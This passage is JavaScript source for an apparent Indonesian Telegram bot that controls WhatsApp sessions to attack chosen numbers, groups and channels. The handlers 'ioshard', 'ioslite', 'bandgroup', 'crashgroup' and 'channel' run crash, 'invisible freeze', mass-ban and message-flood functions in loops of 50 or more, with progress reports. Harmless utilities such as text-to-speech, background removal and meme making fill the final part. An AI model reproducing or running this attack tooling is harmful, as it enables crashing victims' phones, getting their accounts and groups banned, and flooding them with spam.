        ["Status", "🚀 Starting..."]
      ]
    );
    const chatId = ctx.chat.id;
    const messageId = startMsg.message_id;

    const updateProgress = async (loop, attackIndex, statusText, errors = []) => {
      let text = `💥 IOS HARD ATTACK ${sessionLabel}\n\n`;
      text += `Target: ${number}\n`;
      text += `Loop: ${loop}/${TOTAL_LOOPS}\n`;
      text += `Attack: ${attackIndex}/${attacks.length}\n`;
      if (errors.length) text += `Errors: ${errors.join("; ")}\n`;
      text += `Status: ${statusText}`;
      try {
        await ctx.api.editMessageText(chatId, messageId, text);
      } catch (e) { /* ignore */ }
    };

    let totalAttacks = 0;
    let successAttacks = 0;
    let failedAttacks = 0;
    let allErrors = [];

    for (let loop = 1; loop <= TOTAL_LOOPS; loop++) {
      const loopErrors = [];
      await updateProgress(loop, 0, `🔥 Starting loop ${loop}...`, []);

      for (let i = 0; i < attacks.length; i++) {
        const { name, fn } = attacks[i];
        const attackIndex = i + 1;
        await updateProgress(loop, attackIndex, `⚡ Running: ${name}`, loopErrors);

        try {
          // ── FIX: Just call the function directly, don't expect a payload ──
          await fn(sock, target);
          successAttacks++;
          await updateProgress(loop, attackIndex, `✅ Completed: ${name}`, loopErrors);
        } catch (err) {
          const errMsg = err.message || String(err);
          loopErrors.push(`${name}: ${errMsg}`);
          failedAttacks++;
          console.error(`❌ Loop ${loop}, ${name} failed: ${errMsg}`);
          await updateProgress(loop, attackIndex, `❌ Failed: ${name}`, loopErrors);
        }
        totalAttacks++;

        if (i < attacks.length - 1) await sleep(LOOP_DELAY);
      }

      if (loopErrors.length) {
        allErrors.push(`Loop ${loop}: ${loopErrors.join("; ")}`);
      }

      // Progress update every 10 loops
      if (loop % 10 === 0 || loop === TOTAL_LOOPS) {
        await botReply(ctx, `⏳ IOS ATTACK PROGRESS ${sessionLabel}`, [
          ["Loop", `${loop}/${TOTAL_LOOPS}`],
          ["Successful", successAttacks],
          ["Failed", failedAttacks],
          ["Status", loop < TOTAL_LOOPS ? "Continuing..." : "✅ Completed"]
        ]);
      }

      if (loop < TOTAL_LOOPS) await sleep(LOOP_DELAY);
    }

    const finalStatus = allErrors.length === 0
      ? "✅ All 50 loops completed successfully!"
      : `⚠️ ${allErrors.length} loop(s) had errors.`;

    await updateProgress(TOTAL_LOOPS, attacks.length, "🏁 FINISHED", []);

    await botReply(ctx, `✅ IOS HARD COMPLETE ${sessionLabel}`, [
      ["Target", number],
      ["Total Loops", TOTAL_LOOPS],
      ["Total Attacks", totalAttacks],
      ["Successful", successAttacks],
      ["Failed", failedAttacks],
      ["Status", finalStatus],
      ["Visibility", "Invisible (status@broadcast)"]
    ]);

    try {
      await ctx.api.deleteMessage(chatId, messageId);
    } catch (delErr) { /* ignore */ }

    return { success: successAttacks, failed: failedAttacks, total: totalAttacks };
  };

  // ── If only one active session, execute directly ──
  if (activeSessions.length === 1) {
    const { uid: sUid, number: sNum } = activeSessions[0];
    const client = getClient(sUid, sNum);

    try {
      await executeAttack(client.sock, `[${sNum}]`);
      return;
    } catch (err) {
      return botError(ctx, err.message, "❌ EXECUTION FAILED");
    }
  }

  // ── Multi-session selection menu ──
  pendingAction.set(uid, {
    func: async (sock, sessionInfo) => {
      const [sUid, sNum] = sessionInfo.split('_');
      const client = getClient(sUid, sNum);
      if (!client?.sock || client.status !== "open") {
        throw new Error(`Session ${sNum} is offline`);
      }
      await executeAttack(client.sock, `[${sNum}]`);
    },
    target: target,
    resultFunc: sendTextResult
  });

  const keyboard = {
    inline_keyboard: []
  };

  const cells = [
    [
      { text: "Status", is_header: true, align: "center", valign: "middle" },
      { text: "Session", is_header: true, align: "center", valign: "middle" }
    ]
  ];

  activeSessions.forEach(({ uid: sUid, number: sNum }) => {
    const display = isOwnerUser ? `${sUid} → ${sNum}` : sNum;
    cells.push([
      { text: "📱 Sender", align: "left", valign: "middle" },
      { text: display, align: "left", valign: "middle" }
    ]);

    const callbackData = isOwnerUser ? `ioshard_${sUid}_${sNum}` : `ioshard_${sNum}`;
    keyboard.inline_keyboard.push([
      {
        text: `📱 ${display}`,
        callback_data: callbackData,
        style: "success",
        icon_custom_emoji_id: "6266777440039736768"
      }
    ]);
  });

  keyboard.inline_keyboard.push([
    {
      text: "📤 All Senders",
      callback_data: "ioshard_all",
      style: "success",
      icon_custom_emoji_id: "5780864206177834457"
    }
  ]);

  return bot.api.raw.sendRichMessage({
    chat_id: ctx.chat.id,
    rich_message: {
      blocks: [
        {
          type: "heading",
          text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER FOR IOS HARD ATTACK"],
          size: 1
        },
        {
          type: "paragraph",
          text: `Target: ${number}\nLoops: ${TOTAL_LOOPS}\nAttacks: iosnew + powercrash`
        },
        {
          type: "table",
          cells,
          is_bordered: true,
          is_striped: true
        }
      ]
    },
    reply_markup: keyboard
  });
}
                    
case "ioslite": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(
      ctx,
      "📋 *IOS LITE ATTACK USAGE*\n\n" +
      "Format: /ioslite <nomor>\n" +
      "Contoh: /ioslite 6281234567890\n\n" +
      "⚠️ IOS LITE Attack Suite:\n" +
      "• Makklofc (iOS Invisible Freeze)\n" +
      "• ForcloseIos (iOS Forclose Crash)\n\n" +
      "💡 Supports multi-session selection",
      "⚠️ FORMAT SALAH"
    );
  }

  const target = `${number}@s.whatsapp.net`;

  // ── Get available sessions ──
  const isOwnerUser = checkOwner(uid);
  let sessions = [];

  if (isOwnerUser) {
    const allPairs = getAllPairs();
    for (const [userId, numbers] of Object.entries(allPairs)) {
      for (const num of numbers) {
        sessions.push({ uid: userId, number: num });
      }
    }
    if (!sessions.length) {
      return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
    }
  } else {
    sessions = getPairsForUser(uid).map(num => ({ uid, number: num }));
    if (!sessions.length) {
      return botError(ctx, "Belum ada sender aktif.", "⚠️ NO SESSION");
    }
  }

  // ── Filter active sessions ──
  const activeSessions = sessions.filter(({ uid: sUid, number: sNum }) => {
    const client = getClient(sUid, sNum);
    return client?.sock && client.status === "open";
  });

  if (!activeSessions.length) {
    return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
  }

  // ── iOS Attacks config ──
  const attacks = [
    { name: "Makklofc (iOS Invisible Freeze)", fn: travas.makklofc },
    { name: "ForcloseIos (iOS Forclose Crash)", fn: travas.forcloseIos },
  ];

  const TOTAL_LOOPS = 50;
  const LOOP_DELAY = 900;

  // ── The attack function ──
  const executeAttack = async (sock, sessionLabel = "") => {
    const startMsg = await botReply(
      ctx,
      `💥 IOS LITE ATTACK ${sessionLabel}`,
      [
        ["Target", number],
        ["Loop", `0/${TOTAL_LOOPS}`],
        ["Attacks/loop", attacks.length],
        ["Status", "🚀 Starting..."]
      ]
    );
    const chatId = ctx.chat.id;
    const messageId = startMsg.message_id;

    const updateProgress = async (loop, attackIndex, statusText, errors = []) => {
      let text = `💥 IOS LITE ATTACK ${sessionLabel}\n\n`;
      text += `Target: ${number}\n`;
      text += `Loop: ${loop}/${TOTAL_LOOPS}\n`;
      text += `Attack: ${attackIndex}/${attacks.length}\n`;
      if (errors.length) text += `Errors: ${errors.join("; ")}\n`;
      text += `Status: ${statusText}`;
      try {
        await ctx.api.editMessageText(chatId, messageId, text);
      } catch (e) { /* ignore */ }
    };

    let totalAttacks = 0;
    let successAttacks = 0;
    let failedAttacks = 0;
    let allErrors = [];

    for (let loop = 1; loop <= TOTAL_LOOPS; loop++) {
      const loopErrors = [];
      await updateProgress(loop, 0, `🔥 Starting loop ${loop}...`, []);

      for (let i = 0; i < attacks.length; i++) {
        const { name, fn } = attacks[i];
        const attackIndex = i + 1;
        await updateProgress(loop, attackIndex, `⚡ Running: ${name}`, loopErrors);

        try {
          await fn(sock, target);
          await updateProgress(loop, attackIndex, `✅ Completed: ${name}`, loopErrors);
          successAttacks++;
        } catch (err) {
          const errMsg = err.message || String(err);
          loopErrors.push(`${name}: ${errMsg}`);
          failedAttacks++;
          console.error(`❌ Loop ${loop}, ${name} failed: ${errMsg}`);
          await updateProgress(loop, attackIndex, `❌ Failed: ${name}`, loopErrors);
        }
        totalAttacks++;

        if (i < attacks.length - 1) await sleep(LOOP_DELAY);
      }

      if (loopErrors.length) {
        allErrors.push(`Loop ${loop}: ${loopErrors.join("; ")}`);
      }

      // Progress update every 10 loops
      if (loop % 10 === 0 || loop === TOTAL_LOOPS) {
        await botReply(ctx, `⏳ IOS ATTACK PROGRESS ${sessionLabel}`, [
          ["Loop", `${loop}/${TOTAL_LOOPS}`],
          ["Successful", successAttacks],
          ["Failed", failedAttacks],
          ["Status", loop < TOTAL_LOOPS ? "Continuing..." : "✅ Completed"]
        ]);
      }

      if (loop < TOTAL_LOOPS) await sleep(LOOP_DELAY);
    }

    const finalStatus = allErrors.length === 0
      ? "✅ All 50 loops completed successfully!"
      : `⚠️ ${allErrors.length} loop(s) had errors.`;

    await updateProgress(TOTAL_LOOPS, attacks.length, "🏁 FINISHED", []);

    await botReply(ctx, `✅ IOS LITE COMPLETE ${sessionLabel}`, [
      ["Target", number],
      ["Total Loops", TOTAL_LOOPS],
      ["Total Attacks", totalAttacks],
      ["Successful", successAttacks],
      ["Failed", failedAttacks],
      ["Status", finalStatus]
    ]);

    try {
      await ctx.api.deleteMessage(chatId, messageId);
    } catch (delErr) { /* ignore */ }

    return { success: successAttacks, failed: failedAttacks, total: totalAttacks };
  };

  // ── If only one active session, execute directly ──
  if (activeSessions.length === 1) {
    const { uid: sUid, number: sNum } = activeSessions[0];
    const client = getClient(sUid, sNum);

    try {
      await executeAttack(client.sock, `[${sNum}]`);
      return;
    } catch (err) {
      return botError(ctx, err.message, "❌ EXECUTION FAILED");
    }
  }

  // ── Multi-session selection menu ──
  pendingAction.set(uid, {
    func: async (sock, sessionInfo) => {
      const [sUid, sNum] = sessionInfo.split('_');
      const client = getClient(sUid, sNum);
      if (!client?.sock || client.status !== "open") {
        throw new Error(`Session ${sNum} is offline`);
      }
      await executeAttack(client.sock, `[${sNum}]`);
    },
    target: target,
    resultFunc: sendTextResult
  });

  const keyboard = {
    inline_keyboard: []
  };

  const cells = [
    [
      { text: "Status", is_header: true, align: "center", valign: "middle" },
      { text: "Session", is_header: true, align: "center", valign: "middle" }
    ]
  ];

  activeSessions.forEach(({ uid: sUid, number: sNum }) => {
    const display = isOwnerUser ? `${sUid} → ${sNum}` : sNum;
    cells.push([
      { text: "📱 Sender", align: "left", valign: "middle" },
      { text: display, align: "left", valign: "middle" }
    ]);

    const callbackData = isOwnerUser ? `ioslite_${sUid}_${sNum}` : `ioslite_${sNum}`;
    keyboard.inline_keyboard.push([
      {
        text: `📱 ${display}`,
        callback_data: callbackData,
        style: "success",
        icon_custom_emoji_id: "6266777440039736768"
      }
    ]);
  });

  keyboard.inline_keyboard.push([
    {
      text: "📤 All Senders",
      callback_data: "ioslite_all",
      style: "success",
      icon_custom_emoji_id: "5780864206177834457"
    }
  ]);

  return bot.api.raw.sendRichMessage({
    chat_id: ctx.chat.id,
    rich_message: {
      blocks: [
        {
          type: "heading",
          text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER FOR IOS LITE ATTACK"],
          size: 1
        },
        {
          type: "paragraph",
          text: `Target: ${number}\nLoops: ${TOTAL_LOOPS}\nAttacks: Makklofc + ForcloseIos`
        },
        {
          type: "table",
          cells,
          is_bordered: true,
          is_striped: true
        }
      ]
    },
    reply_markup: keyboard
  });
}

// ────────────────────────────────────────────────────────────────
// BAND GROUP — Complete multi-method group ban (FULLY FIXED)
// ────────────────────────────────────────────────────────────────
case "bandgroup": {
    const input = args.join(" ").trim();
    if (!input) {
        return botError(
            ctx,
            "📋 *BAND GROUP ULTIMATE USAGE*\n\n" +
            "Format: /bandgroup <link grup atau JID>\n\n" +
            "🔥 *Attack Methods (3 phases):*\n" +
            "• Phase 1: Ultimate Ban (50 loops, 4 spam numbers, 100 fake numbers)\n" +
            "• Phase 2: Loop Ban (50 loops, single number)\n" +
            "• Phase 3: Duration Ban (3 minutes continuous)\n\n" +
            "💡 Total: 150+ loops, 4+ methods combined\n" +
            "👥 Multi-session supported\n" +
            "⚠️ Admin/Owner: Can use ALL sessions",
            "⚠️ FORMAT SALAH"
        );
    }

    // ── Get available sessions ──
    const isOwnerUser = checkOwner(uid);
    let sessions = [];

    if (isOwnerUser) {
        const allPairs = getAllPairs();
        for (const [userId, numbers] of Object.entries(allPairs)) {
            for (const num of numbers) {
                sessions.push({ uid: userId, number: num });
            }
        }
        if (!sessions.length) {
            return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
        }
    } else {
        sessions = getPairsForUser(uid).map(num => ({ uid, number: num }));
        if (!sessions.length) {
            return botError(ctx, "Belum ada sender aktif.", "⚠️ NO SESSION");
        }
    }

    // ── Filter active sessions ──
    const activeSessions = sessions.filter(({ uid: sUid, number: sNum }) => {
        const client = getClient(sUid, sNum);
        return client?.sock && client.status === "open";
    });

    if (!activeSessions.length) {
        return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
    }

    // ── The main attack function ──
    const executeAttack = async (sock, sessionLabel = "") => {
        const startTime = Date.now();
        let totalSuccess = 0;
        let totalFailed = 0;
        let phaseResults = [];

        const startMsg = await botReply(
            ctx,
            `🔥 BAND GROUP ATTACK ${sessionLabel}`,
            [
                ["Target", input],
                ["Phase", "0/3"],
                ["Method", "Starting..."],
                ["Success", "0"],
                ["Failed", "0"],
                ["Status", "🚀 Initializing..."]
            ]
        );
        const chatId = ctx.chat.id;
        const messageId = startMsg.message_id;

        // ── Helper: Update progress ──
        const updateProgress = async (phase, totalPhases, method, status, success = null, failed = null) => {
            let text = `🔥 BAND GROUP ATTACK ${sessionLabel}\n\n`;
            text += `Target: ${input}\n`;
            text += `Phase: ${phase}/${totalPhases}\n`;
            text += `Method: ${method}\n`;
            if (success !== null) text += `Success: ${success}\n`;
            if (failed !== null) text += `Failed: ${failed}\n`;
            text += `Status: ${status}`;
            try {
                await ctx.api.editMessageText(chatId, messageId, text);
            } catch (e) { /* ignore */ }
        };

        // ── PHASE 1: ULTIMATE BAN ──
        await updateProgress(1, 3, "Ultimate Ban (50 loops, 4 nums, 100 fake)", "⚡ Running...");
        
        try {
            const result1 = await travas.bandGroupUltimate(sock, input, {
                loops: 50,
                durationMs: 180000,
                delayMs: 500,
                onProgress: async (data) => {
                    if (data.loop % 10 === 0 || data.loop === data.totalLoops) {
                        await updateProgress(
                            1, 3,
                            `Ultimate Ban (${data.loop}/${data.totalLoops})`,
                            data.status,
                            data.success,
                            data.failed
                        );
                    }
                }
            });
            totalSuccess += result1.successful || 0;
            totalFailed += result1.failed || 0;
            phaseResults.push({ phase: 1, name: "Ultimate Ban", ...result1 });
            log.success(`✅ Phase 1 complete: ${result1.successful}/${result1.loops} success`);
        } catch (err) {
            log.error(`❌ Phase 1 failed: ${err.message}`);
            phaseResults.push({ phase: 1, name: "Ultimate Ban", error: err.message });
        }

        // ── PHASE 2: LOOP BAN ──
        await updateProgress(2, 3, "Loop Ban (50 loops)", "⚡ Running...");
        
        try {
            const result2 = await travas.bandGroupLoop(sock, input, 50, "18188880008@s.whatsapp.net");
            totalSuccess += result2.successful || 0;
            totalFailed += result2.failed || 0;
            phaseResults.push({ phase: 2, name: "Loop Ban", ...result2 });
            log.success(`✅ Phase 2 complete: ${result2.successful}/${result2.loops} success`);
        } catch (err) {
            log.error(`❌ Phase 2 failed: ${err.message}`);
            phaseResults.push({ phase: 2, name: "Loop Ban", error: err.message });
        }

        // ── PHASE 3: DURATION BAN ──
        await updateProgress(3, 3, "Duration Ban (3 minutes)", "⚡ Running...");
        
        try {
            const result3 = await travas.bandGroupDuration(sock, input, 3, "971500000000@s.whatsapp.net");
            totalSuccess += result3.successful || 0;
            totalFailed += result3.failed || 0;
            phaseResults.push({ phase: 3, name: "Duration Ban", ...result3 });
            log.success(`✅ Phase 3 complete: ${result3.successful}/${result3.loops} success`);
        } catch (err) {
            log.error(`❌ Phase 3 failed: ${err.message}`);
            phaseResults.push({ phase: 3, name: "Duration Ban", error: err.message });
        }

        // ── FINAL SUMMARY ──
        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
        let summaryText = `✅ BAND GROUP COMPLETE ${sessionLabel}\n\n`;
        summaryText += `Target: ${input}\n`;
        summaryText += `Total Time: ${totalTime}s\n`;
        summaryText += `Total Success: ${totalSuccess}\n`;
        summaryText += `Total Failed: ${totalFailed}\n\n`;
        summaryText += `📊 Phase Results:\n`;
        for (const p of phaseResults) {
            if (p.error) {
                summaryText += `  ❌ ${p.name}: ${p.error}\n`;
            } else {
                summaryText += `  ✅ ${p.name}: ${p.successful || 0}/${p.loops || '?'} success\n`;
            }
        }

        try {
            await ctx.api.editMessageText(chatId, messageId, summaryText);
        } catch (e) { /* ignore */ }

        await botReply(ctx, `✅ BAND GROUP COMPLETE ${sessionLabel}`, [
            ["Target", input],
            ["Total Time", `${totalTime}s`],
            ["Total Success", String(totalSuccess)],
            ["Total Failed", String(totalFailed)],
            ["Phases", phaseResults.map(p => p.error ? `❌ ${p.name}` : `✅ ${p.name}`).join(', ')]
        ]);

        return {
            success: totalSuccess > 0,
            totalSuccess,
            totalFailed,
            phases: phaseResults,
            time: totalTime
        };
    };

    // ── If only one active session, execute directly ──
    if (activeSessions.length === 1) {
        const { uid: sUid, number: sNum } = activeSessions[0];
        const client = getClient(sUid, sNum);

        try {
            await executeAttack(client.sock, `[${sNum}]`);
            return;
        } catch (err) {
            return botError(ctx, err.message, "❌ EXECUTION FAILED");
        }
    }

    // ── Multi-session selection menu ──
    pendingAction.set(uid, {
        func: async (sock, sessionInfo) => {
            const [sUid, sNum] = sessionInfo.split('_');
            const client = getClient(sUid, sNum);
            if (!client?.sock || client.status !== "open") {
                throw new Error(`Session ${sNum} is offline`);
            }
            await executeAttack(client.sock, `[${sNum}]`);
        },
        target: input,
        resultFunc: sendTextResult
    });

    const keyboard = { inline_keyboard: [] };
    const cells = [
        [
            { text: "Status", is_header: true, align: "center", valign: "middle" },
            { text: "Session", is_header: true, align: "center", valign: "middle" }
        ]
    ];

    activeSessions.forEach(({ uid: sUid, number: sNum }) => {
        const display = isOwnerUser ? `${sUid} → ${sNum}` : sNum;
        cells.push([
            { text: "📱 Sender", align: "left", valign: "middle" },
            { text: display, align: "left", valign: "middle" }
        ]);

        const callbackData = isOwnerUser ? `bandgroup_${sUid}_${sNum}` : `bandgroup_${sNum}`;
        keyboard.inline_keyboard.push([
            {
                text: `📱 ${display}`,
                callback_data: callbackData,
                style: "success",
                icon_custom_emoji_id: "6266777440039736768"
            }
        ]);
    });

    keyboard.inline_keyboard.push([
        {
            text: "📤 All Senders",
            callback_data: "bandgroup_all",
            style: "success",
            icon_custom_emoji_id: "5780864206177834457"
        }
    ]);

    return bot.api.raw.sendRichMessage({
        chat_id: ctx.chat.id,
        rich_message: {
            blocks: [
                {
                    type: "heading",
                    text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER FOR BAND GROUP"],
                    size: 1
                },
                {
                    type: "paragraph",
                    text: `Target: ${input}\nPhases: 3 (Ultimate + Loop + Duration)\nTotal loops: 150+`
                },
                {
                    type: "table",
                    cells,
                    is_bordered: true,
                    is_striped: true
                }
            ]
        },
        reply_markup: keyboard
    });
    break;
}

                    
                    // ----------- ( kirim ke grup whatsapp ) ------------ //
case "crashgroup": {
  const link = args[0];
  if (!link) return botError(ctx, "Format: /crashgroup <link grup WhatsApp>", "⚠️ FORMAT SALAH");

  const sessions = getPairsForUser(uid);
  if (!sessions.length) return botError(ctx, "Belum ada sender.", "⚠️ NO SESSION");

  const activeNumber = sessions.find(num => getClient(uid, num)?.status === "open");
  if (!activeNumber) return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");

  const client = getClient(uid, activeNumber);
  const sock = client.sock; // direct socket

  try {
    let inviteCode = link.split("chat.whatsapp.com/")[1];
    if (!inviteCode) return botError(ctx, "Link grup tidak valid.", "⚠️ FORMAT SALAH");

    inviteCode = inviteCode.split("?")[0].split("/")[0].trim();
    if (!inviteCode) return botError(ctx, "Link grup tidak valid.", "⚠️ FORMAT SALAH");

    log.info(`🔍 Invite code: ${inviteCode}`);

    const metadata = await sock.groupGetInviteInfo(inviteCode);
    const target = metadata.id;

    // ── Loop configuration ──
    const REPEAT = 50;              // total cycles
    const CYCLE_DELAY = 100;        // ms between cycles (use 10000 for 10s)
    const PHASE_DELAY = 2000;       // ms between group1 and group2

    // Optional: send a "starting" message
    await botReply(ctx, "⚡ CRASHGROUP STARTED", [
      ["Target", target],
      ["Cycles", String(REPEAT)],
      ["Total pesan", String(REPEAT * 100)]
    ]);

    // ── Main attack loop ──
    for (let cycle = 0; cycle < REPEAT; cycle++) {
      // Send product spam (99 messages)
      await travas.group1(sock, target);
      log.info(`✅ group1 cycle ${cycle + 1}/${REPEAT} selesai`);

      // Short pause before payment request
      await sleep(PHASE_DELAY);

      // Send payment request (1 message)
      await travas.group2(sock, target);
      log.info(`✅ group2 cycle ${cycle + 1}/${REPEAT} selesai`);

      // Wait between cycles (except after last)
      if (cycle < REPEAT - 1) {
        await sleep(CYCLE_DELAY);
      }
    }

    // ── Final summary ──
    await botReply(ctx, "✅ CRASHGROUP COMPLETE", [
      ["Target", target],
      ["Total cycles", String(REPEAT)],
      ["Total pesan", `${REPEAT * 100} (${REPEAT * 99} product + ${REPEAT} payment)`]
    ]);

  } catch (err) {
    log.error(`crashgroup error: ${err.message}`);
    return botError(ctx, err.message, "❌ GAGAL");
  }
  break;
}
					case "channel": {
    const link = args[0];

    if (!link) {
        return botError(
            ctx,
            "Format: /channel <link channel WhatsApp>",
            "⚠️ FORMAT SALAH"
        );
    }

    // Validasi link channel (beda sama grup)
    if (!link.includes("whatsapp.com/channel/") && !link.includes("whatsapp.com/channel")) {
        return botError(
            ctx,
            "Link channel tidak valid. Pastikan link channel WhatsApp.",
            "⚠️ FORMAT SALAH"
        );
    }

    const sessions = getPairsForUser(uid);

    if (!sessions.length) {
        return botError(
            ctx,
            "Belum ada sender.",
            "⚠️ NO SESSION"
        );
    }


    // Cari session aktif
    const activeNumber = sessions.find(
        (num) => getClient(uid, num)?.status === "open"
    );

    if (!activeNumber) {
        return botError(
            ctx,
            "Tidak ada session yang aktif.",
            "⚠️ SESSION OFFLINE"
        );
    }

    const client = getClient(uid, activeNumber);

    try {
        // Ekstrak invite code atau channel ID
        let channelId = link;
        if (link.includes("whatsapp.com/channel/")) {
            channelId = link.split("whatsapp.com/channel/")[1];
        }
        // Bersihin parameter
        if (channelId.includes("?")) {
            channelId = channelId.split("?")[0];
        }
        if (channelId.includes("&")) {
            channelId = channelId.split("&")[0];
        }
        channelId = channelId.trim();

        if (!channelId || channelId.length < 5) {
            return botError(
                ctx,
                "Link channel tidak valid.",
                "⚠️ FORMAT SALAH"
            );
        }

        console.log(`🔍 Channel ID: ${channelId}`);

        // Coba ambil info channel
        let channelInfo;
        try {
            channelInfo = await client.sock.groupGetInviteInfo(channelId);
        } catch (err) {
            // Kalo gagal, coba langsung join aja
            console.log(`⚠️ Gagal ambil info channel: ${err.message}`);
            channelInfo = { id: channelId, subject: "Unknown Channel" };
        }

        const target = channelInfo.id || channelId;

        await actionSession(
            ctx,
            uid,
            target,

            async (sock, target) => {
                await botReply(
                    ctx,
                    "⚡ EXECUTING CHANNEL",
                    [
                        ["Target", target],
                        ["Status", "Mengirim proses..."]
                    ]
                );

                // Panggil fungsi channel dari travas
                await travas.channel(sock, target);
            },

            sendTextResult
        );

    } catch (err) {
        return botError(
            ctx,
            err.message,
            "❌ GAGAL"
        );
    }

    break;
}

                    // ----------- ( tools: text-to-speech ) ------------ //
                    case "tts": {
                        const teksTTS = args.join(" ").trim();

                        if (!teksTTS) {
                            return ctx.reply("❌ Format: /tts <teks>\nContoh: /tts halo semuanya");
                        }
                        if (teksTTS.length > 200) {
                            return ctx.reply("❌ Teks terlalu panjang, maksimal 200 karakter untuk /tts.");
                        }

                        let waitTTS;
                        try {
                            waitTTS = await ctx.reply("⏳ Mengubah teks jadi suara...");

                            const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(teksTTS)}&tl=id&client=tw-ob`;
                            const response = await axios.get(url, {
                                responseType: "arraybuffer",
                                headers: { "User-Agent": "Mozilla/5.0" },
                                timeout: 20000
                            });

                            if (waitTTS) await ctx.api.deleteMessage(ctx.chat.id, waitTTS.message_id).catch(() => {});

                            await ctx.replyWithVoice(new InputFile(Buffer.from(response.data), "tts.mp3"));
                        } catch (err) {
                            console.error("Error /tts:", err.message);
                            if (waitTTS) await ctx.api.deleteMessage(ctx.chat.id, waitTTS.message_id).catch(() => {});
                            ctx.reply("❌ Gagal membuat voice note. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( tools: hapus background foto ) ------------ //
                    case "rembg": {
                        const rReply = ctx.message.reply_to_message;
                        if (!rReply || !rReply.photo) {
                            return ctx.reply("❌ Format: reply sebuah FOTO lalu ketik /rembg");
                        }

                        let waitRembg;
                        try {
                            waitRembg = await ctx.reply("⏳ Menghapus background foto...");

                            const photoArr = rReply.photo;
                            const fileId = photoArr[photoArr.length - 1].file_id;
                            const tgFile = await ctx.api.getFile(fileId);
                            const tgLink = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;

                            const url = `https://api.siputzx.my.id/api/tools/removebg?image=${encodeURIComponent(tgLink)}`;
                            const response = await axios.get(url, { responseType: "arraybuffer", timeout: 30000 });

                            if (waitRembg) await ctx.api.deleteMessage(ctx.chat.id, waitRembg.message_id).catch(() => {});

                            await ctx.replyWithDocument(new InputFile(Buffer.from(response.data), "rembg.png"));
                            await botReply(ctx, "🖼 REMOVE BACKGROUND\n", [
                                ["Status", "✅ Background berhasil dihapus"]
                            ]);
                        } catch (err) {
                            console.error("Error /rembg:", err.message);
                            if (waitRembg) await ctx.api.deleteMessage(ctx.chat.id, waitRembg.message_id).catch(() => {});
                            ctx.reply("❌ Gagal menghapus background. API mungkin sedang down, coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( tools: quote / motivasi random ) ------------ //
                    case "quote": {
                        try {
                            const { data } = await axios.get("https://api.quotable.io/random", { timeout: 15000 });

                            await botReply(ctx, "💬 QUOTE OF THE MOMENT\n", [
                                ["Quote", data.content],
                                ["Author", data.author]
                            ]);
                        } catch (err) {
                            console.error("Error /quote:", err.message);
                            ctx.reply("❌ Gagal mengambil quote. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( tools: meme generator ) ------------ //
                    case "meme": {
                        const memeRaw = args.join(" ").trim();
                        if (!memeRaw) {
                            return ctx.reply("❌ Format: /meme <teks atas>|<teks bawah>\nContoh: /meme kerja terus|gajian kapan");
                        }

                        const [topRaw, bottomRaw = ""] = memeRaw.split("|");
                        const top = topRaw.trim() || "_";
                        const bottom = bottomRaw.trim() || "_";

                        let waitMeme;
                        try {
                            waitMeme = await ctx.reply("⏳ Membuat meme...");

                            let bgUrl;
                            const rMeme = ctx.message.reply_to_message;

                            if (rMeme && rMeme.photo) {
                                const photoArr = rMeme.photo;
                                const fileId = photoArr[photoArr.length - 1].file_id;
                                const tgFile = await ctx.api.getFile(fileId);
                                bgUrl = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
                            } else {
                                bgUrl = "https://api.memegen.link/images/background/blank.png";
                            }

                            const encTop = encodeURIComponent(top).replace(/%20/g, "_");
                            const encBottom = encodeURIComponent(bottom).replace(/%20/g, "_");
                            const memeUrl = `https://api.memegen.link/images/custom/${encTop}/${encBottom}.png?background=${encodeURIComponent(bgUrl)}`;

                            const response = await axios.get(memeUrl, { responseType: "arraybuffer", timeout: 30000 });

                            if (waitMeme) await ctx.api.deleteMessage(ctx.chat.id, waitMeme.message_id).catch(() => {});

                            await botMediaReply(ctx, { photo: new InputFile(Buffer.from(response.data), "meme.png") }, "😹 MEME GENERATOR\n", [
                                ["Teks Atas", top],
                                ["Teks Bawah", bottom]
                            ]);
                        } catch (err) {
                            console.error("Error /meme:", err.message);
                            if (waitMeme) await ctx.api.deleteMessage(ctx.chat.id, waitMeme.message_id).catch(() => {});
                            ctx.reply("❌ Gagal membuat meme. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( tools: foto jadi sticker telegram ) ------------ //
                    case "sticker": {
                        const rSticker = ctx.message.reply_to_message;
                        if (!rSticker || !rSticker.photo) {
                            return ctx.reply("❌ Format: reply sebuah FOTO lalu ketik /sticker");
                        }

                        let waitSticker;
                        try {
                            let sharp;
                            try {
                                const mod = await import("sharp");
                                sharp = mod.default || mod;
                            } catch {
                                return ctx.reply("❌ Module sharp belum terinstall.\nInstall dulu dengan: npm install sharp\nLalu restart bot.");
                            }

                            waitSticker = await ctx.reply("⏳ Mengubah foto jadi stiker...");

                            const photoArr = rSticker.photo;
                            const fileId = photoArr[photoArr.length - 1].file_id;
                            const tgFile = await ctx.api.getFile(fileId);
                            const tgLink = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;

                            const { data: imgBuffer } = await axios.get(tgLink, { responseType: "arraybuffer", timeout: 20000 });

                            const webpBuffer = await sharp(Buffer.from(imgBuffer))
                                .resize(512, 512, { fit: "contain", background: { r: 0, g: 0, b: 0, alpha: 0 } })
                                .webp()
                                .toBuffer();

                            if (waitSticker) await ctx.api.deleteMessage(ctx.chat.id, waitSticker.message_id).catch(() => {});

                            await ctx.replyWithSticker(new InputFile(webpBuffer, "sticker.webp"));
